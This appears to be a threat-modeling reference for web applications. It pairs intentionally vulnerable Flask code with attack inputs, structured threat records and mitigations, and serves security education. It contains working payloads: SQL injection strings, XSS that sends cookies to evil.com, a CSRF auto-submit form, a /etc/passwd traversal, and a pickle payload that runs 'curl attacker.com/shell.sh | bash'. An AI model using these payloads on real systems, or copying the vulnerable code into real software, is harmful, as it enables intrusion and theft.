# Web Application Threat Modeling Examples

Real-world threat scenarios for traditional web applications.

## SQL Injection Examples

### Example 1: Search Functionality

**Vulnerable Code:**
```python
@app.route('/search')
def search():
    query = request.args.get('q', '')
    # VULNERABLE: String concatenation in SQL
    cursor.execute(f"SELECT * FROM products WHERE name LIKE '%{query}%'")
    return render_template('results.html', products=cursor.fetchall())
```

**Attack:**
```
GET /search?q=' UNION SELECT username, password, null FROM users--
```

**Threat Output:**
```json
{
  "id": "THREAT-001",
  "category": "Tampering",
  "title": "SQL Injection in Product Search",
  "description": "The search endpoint directly concatenates user input into SQL query without parameterization, allowing attackers to extract sensitive data from other tables.",
  "severity": "critical",
  "affected_components": ["app.py:search()", "products table", "users table"],
  "attack_scenario": "Attacker submits UNION-based injection payload to extract user credentials from the database",
  "owasp_category": "A03:2021 Injection",
  "vulnerability_types": ["CWE-89", "CWE-20"],
  "mitigation": "Use parameterized queries: cursor.execute('SELECT * FROM products WHERE name LIKE ?', (f'%{query}%',))"
}
```

### Example 2: Login Authentication Bypass

**Vulnerable Code:**
```python
def authenticate(username, password):
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    user = db.execute(query).fetchone()
    return user is not None
```

**Attack:**
```
username: admin'--
password: anything
```

**Resulting Query:**
```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
```

---

## XSS Examples

### Example 3: Reflected XSS in Error Message

**Vulnerable Code:**
```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    if not valid_user(username):
        # VULNERABLE: User input reflected without encoding
        return f"<p>User '{username}' not found</p>", 404
```

**Attack:**
```
POST /login
username=<script>document.location='http://evil.com/steal?c='+document.cookie</script>
```

**Threat Output:**
```json
{
  "id": "THREAT-002",
  "category": "Tampering",
  "title": "Reflected XSS in Login Error",
  "description": "Login error message reflects username without HTML encoding, allowing script injection that executes in victim's browser",
  "severity": "high",
  "affected_components": ["login route", "error handling"],
  "attack_scenario": "Attacker crafts malicious link with XSS payload, victim clicks and session cookie is exfiltrated",
  "owasp_category": "A03:2021 Injection",
  "vulnerability_types": ["CWE-79"],
  "mitigation": "Use template engine with auto-escaping, or explicitly escape: escape(username)"
}
```

### Example 4: Stored XSS in Comments

**Vulnerable Code (Template):**
```html
{% for comment in comments %}
  <div class="comment">
    <strong>{{ comment.author }}</strong>
    {# VULNERABLE: |safe disables escaping #}
    <p>{{ comment.body | safe }}</p>
  </div>
{% endfor %}
```

**Attack:**
```
POST /comments
body=<img src=x onerror="fetch('http://evil.com/log?cookie='+document.cookie)">
```

---

## Broken Access Control Examples

### Example 5: IDOR on User Profile

**Vulnerable Code:**
```python
@app.route('/api/users/<int:user_id>')
@login_required
def get_user(user_id):
    # VULNERABLE: No ownership check
    user = User.query.get(user_id)
    return jsonify(user.to_dict())
```

**Attack:**
```
# Logged in as user 5, accessing user 1 (admin)
GET /api/users/1
Authorization: Bearer <user_5_token>
```

**Threat Output:**
```json
{
  "id": "THREAT-003",
  "category": "Information Disclosure",
  "title": "IDOR Exposes All User Profiles",
  "description": "User profile endpoint returns any user's data when given their ID, without verifying the requester owns that profile",
  "severity": "high",
  "affected_components": ["get_user route", "User model"],
  "attack_scenario": "Authenticated attacker enumerates user IDs to extract all user profiles including admin accounts",
  "owasp_category": "A01:2021 Broken Access Control",
  "vulnerability_types": ["CWE-639", "CWE-284"],
  "mitigation": "Add ownership check: if user_id != current_user.id and not current_user.is_admin: abort(403)"
}
```

### Example 6: Missing Function-Level Access Control

**Vulnerable Code:**
```python
@app.route('/admin/delete-user/<int:user_id>', methods=['POST'])
@login_required  # Only checks authentication, not authorization!
def delete_user(user_id):
    User.query.filter_by(id=user_id).delete()
    db.session.commit()
    return jsonify({'status': 'deleted'})
```

**Attack:**
```
# Regular user calling admin endpoint
POST /admin/delete-user/1
Authorization: Bearer <regular_user_token>
```

---

## CSRF Examples

### Example 7: State Change Without CSRF Token

**Vulnerable Code:**
```python
@app.route('/transfer', methods=['POST'])
@login_required
def transfer_funds():
    # VULNERABLE: No CSRF protection
    to_account = request.form.get('to')
    amount = request.form.get('amount')
    transfer_money(current_user, to_account, amount)
    return redirect('/dashboard')
```

**Attack (on attacker's site):**
```html
<form action="https://bank.com/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

**Threat Output:**
```json
{
  "id": "THREAT-004",
  "category": "Spoofing",
  "title": "CSRF on Fund Transfer",
  "description": "Fund transfer endpoint accepts POST without CSRF token validation, allowing attackers to trick logged-in users into transferring money",
  "severity": "critical",
  "affected_components": ["transfer route", "banking operations"],
  "attack_scenario": "Victim visits attacker's page while logged into bank, hidden form auto-submits transfer to attacker's account",
  "owasp_category": "A01:2021 Broken Access Control",
  "vulnerability_types": ["CWE-352"],
  "mitigation": "Add @csrf_protect decorator, include csrf_token in form, validate on server"
}
```

---

## Authentication Examples

### Example 8: Weak Password Storage

**Vulnerable Code:**
```python
def create_user(username, password):
    # VULNERABLE: MD5 without salt
    password_hash = hashlib.md5(password.encode()).hexdigest()
    user = User(username=username, password=password_hash)
    db.session.add(user)
```

**Threat Output:**
```json
{
  "id": "THREAT-005",
  "category": "Information Disclosure",
  "title": "Weak Password Hashing with MD5",
  "description": "Passwords are hashed with MD5 without salt, making them trivially crackable with rainbow tables if database is compromised",
  "severity": "high",
  "affected_components": ["create_user function", "User model"],
  "attack_scenario": "Attacker obtains database dump, uses rainbow tables to recover plaintext passwords within minutes",
  "owasp_category": "A02:2021 Cryptographic Failures",
  "vulnerability_types": ["CWE-328", "CWE-916"],
  "mitigation": "Use bcrypt or argon2: password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt())"
}
```

### Example 9: No Rate Limiting on Login

**Vulnerable Code:**
```python
@app.route('/login', methods=['POST'])
def login():
    # VULNERABLE: No rate limiting or lockout
    username = request.form.get('username')
    password = request.form.get('password')
    if authenticate(username, password):
        session['user'] = username
        return redirect('/dashboard')
    return 'Invalid credentials', 401
```

---

## Security Misconfiguration Examples

### Example 10: Debug Mode in Production

**Vulnerable Code:**
```python
# config.py
DEBUG = True  # VULNERABLE: Should be False in production

# app.py
app.config['DEBUG'] = DEBUG
app.run(host='0.0.0.0')
```

**Risk:**
- Full stack traces exposed to users
- Interactive debugger accessible
- Source code visible in error pages

### Example 11: Hardcoded Secret Key

**Vulnerable Code:**
```python
app.config['SECRET_KEY'] = 'super-secret-key-123'  # VULNERABLE: Hardcoded
```

**Threat Output:**
```json
{
  "id": "THREAT-006",
  "category": "Spoofing",
  "title": "Hardcoded Flask Secret Key",
  "description": "Session signing key is hardcoded in source code, allowing anyone with code access to forge session cookies",
  "severity": "critical",
  "affected_components": ["app.py", "session management"],
  "attack_scenario": "Attacker views source code (internal or leaked), forges admin session cookie, gains full access",
  "owasp_category": "A05:2021 Security Misconfiguration",
  "vulnerability_types": ["CWE-798", "CWE-321"],
  "mitigation": "Load from environment: app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY')"
}
```

---

## Insecure Deserialization Examples

### Example 12: Pickle Deserialization

**Vulnerable Code:**
```python
@app.route('/load-session', methods=['POST'])
def load_session():
    # VULNERABLE: Deserializing untrusted data
    session_data = base64.b64decode(request.form.get('session'))
    user_session = pickle.loads(session_data)  # RCE vulnerability!
    return jsonify(user_session)
```

**Attack Payload:**
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

payload = base64.b64encode(pickle.dumps(RCE()))
```

---

## Path Traversal Examples

### Example 13: File Download Vulnerability

**Vulnerable Code:**
```python
@app.route('/download')
def download():
    filename = request.args.get('file')
    # VULNERABLE: No path validation
    return send_file(f'/var/www/uploads/{filename}')
```

**Attack:**
```
GET /download?file=../../../etc/passwd
```

**Threat Output:**
```json
{
  "id": "THREAT-007",
  "category": "Information Disclosure",
  "title": "Path Traversal in File Download",
  "description": "File download endpoint allows ../ sequences, enabling attackers to read arbitrary files on the server",
  "severity": "critical",
  "affected_components": ["download route", "file system"],
  "attack_scenario": "Attacker uses path traversal to read /etc/passwd, config files, or source code",
  "owasp_category": "A01:2021 Broken Access Control",
  "vulnerability_types": ["CWE-22", "CWE-23"],
  "mitigation": "Use os.path.basename() and validate against whitelist, or use secure file serving library"
}
```

---

## Combined Attack Chains

### Example 14: XSS → Session Hijacking → Account Takeover

**Chain:**
1. Attacker finds stored XSS in user profile bio
2. Admin views attacker's profile
3. XSS exfiltrates admin's session cookie
4. Attacker uses cookie to access admin panel
5. Attacker extracts all user data

**Threat Output:**
```json
{
  "id": "THREAT-008",
  "category": "Elevation of Privilege",
  "title": "XSS to Admin Account Takeover Chain",
  "description": "Stored XSS in profile bio allows session hijacking of admin users who view the profile, leading to complete system compromise",
  "severity": "critical",
  "affected_components": ["profile bio field", "session management", "admin panel"],
  "attack_scenario": "Attacker stores XSS in bio, waits for admin to view profile, steals admin session, accesses admin panel",
  "owasp_category": "A03:2021 Injection",
  "vulnerability_types": ["CWE-79", "CWE-384", "CWE-269"],
  "mitigation": "Enable auto-escaping, use HttpOnly cookies, implement CSP, add admin IP restrictions"
}
```

